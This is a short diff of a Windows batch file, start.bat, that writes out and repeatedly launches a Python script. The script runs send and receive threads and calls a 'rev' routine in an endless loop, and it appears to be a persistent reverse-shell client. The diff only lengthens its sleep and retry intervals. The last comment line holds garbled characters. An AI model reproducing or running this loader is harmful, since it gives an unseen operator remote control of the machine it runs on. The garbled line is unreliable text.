@@ -109,7 +109,7 @@ if not exist %FILE% (
         echo    threading.Thread^(target=s_o, daemon=True^).start^(^)
         echo    threading.Thread^(target=r_i, daemon=True^).start^(^)
         echo.
-        echo    time.sleep^(30^)
+        echo    time.sleep^(230^)
         echo.
         echo while True^:
         echo    rev^(^)
@@ -117,7 +117,7 @@ if not exist %FILE% (
     ) > %FILE%
 ) else (
    python %FILE%
-   timeout /t 60 >nul
+   timeout /t 200 >nul
 )
 goto loop
 @REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
